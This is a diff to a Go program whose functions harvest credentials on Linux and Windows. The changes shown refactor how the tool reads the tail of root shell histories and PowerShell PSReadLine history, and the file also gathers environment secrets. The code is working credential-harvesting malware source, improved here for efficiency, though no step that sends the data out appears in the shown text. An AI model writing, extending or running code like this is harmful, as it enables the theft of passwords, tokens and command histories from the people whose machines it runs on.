@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"fmt"
+	"io"
 	"os"
 	"path/filepath"
 	"runtime"
@@ -102,15 +103,10 @@ func harvestCredsLinux() ([]byte, error) {
 		"/root/.zsh_history",
 	}
 	for _, hf := range histFiles {
-		if data, err := os.ReadFile(hf); err == nil {
-			lines := strings.Split(string(data), "\n")
-			// Last 30 lines.
-			start := 0
-			if len(lines) > 30 {
-				start = len(lines) - 30
-			}
-			fmt.Fprintf(&buf, "=== %s (last %d lines) ===\n", hf, len(lines[start:]))
-			fmt.Fprintf(&buf, "%s\n", strings.Join(lines[start:], "\n"))
+		lines := readHistoryTail(hf, 30)
+		if len(lines) > 0 {
+			fmt.Fprintf(&buf, "=== %s (last %d lines) ===\n", hf, len(lines))
+			fmt.Fprintf(&buf, "%s\n", strings.Join(lines, "\n"))
 		}
 	}
 
@@ -174,15 +170,11 @@ func harvestCredsWindows() ([]byte, error) {
 	credSection(&buf, "POWERSHELL HISTORY")
 	psHistPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "PowerShell",
 		"PSReadLine", "ConsoleHost_history.txt")
-	if data, err := os.ReadFile(psHistPath); err == nil {
-		lines := strings.Split(string(data), "\n")
-		start := 0
-		if len(lines) > 30 {
-			start = len(lines) - 30
-		}
-		fmt.Fprintf(&buf, "%s\n", strings.Join(lines[start:], "\n"))
+	lines := readHistoryTail(psHistPath, 30)
+	if len(lines) > 0 {
+		fmt.Fprintf(&buf, "%s\n", strings.Join(lines, "\n"))
 	} else {
-		fmt.Fprintf(&buf, "[not accessible: %v]\n", err)
+		fmt.Fprintf(&buf, "[not accessible or empty]\n")
 	}
 
 	// Env secrets.
@@ -276,6 +268,53 @@ func walkDir(dir string, depth, maxDepth int, fn func(string)) {
 			fn(path)
 		}
 	}
+}
+
+// readHistoryTail reads at most the last maxLines lines from path, reading
+// only the last 8KB of the file to avoid unbounded memory usage on large
+// history files.
+func readHistoryTail(path string, maxLines int) []string {
+	fi, err := os.Stat(path)
+	if err != nil || fi.Size() == 0 {
+		return nil
+	}
+	const maxRead = 8192
+	readSize := fi.Size()
+	if readSize > maxRead {
+		readSize = maxRead
+	}
+	f, err := os.Open(path)
+	if err != nil {
+		return nil
+	}
+	defer f.Close()
+
+	if fi.Size() > readSize {
+		f.Seek(fi.Size()-readSize, io.SeekStart)
+	}
+	data := make([]byte, readSize)
+	n, _ := io.ReadFull(f, data)
+	data = data[:n]
+
+	// If we seeked into the middle of the file, discard the first partial line.
+	if fi.Size() > readSize {
+		if idx := bytes.IndexByte(data, '\n'); idx >= 0 {
+			data = data[idx+1:]
+		}
+	}
+
+	raw := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
+	// Filter out empty lines.
+	var lines []string
+	for _, l := range raw {
+		if l != "" {
+			lines = append(lines, l)
+		}
+	}
+	if len(lines) > maxLines {
+		lines = lines[len(lines)-maxLines:]
+	}
+	return lines
 }
 
 // homeDir returns the current user's home directory, falling back to /root.
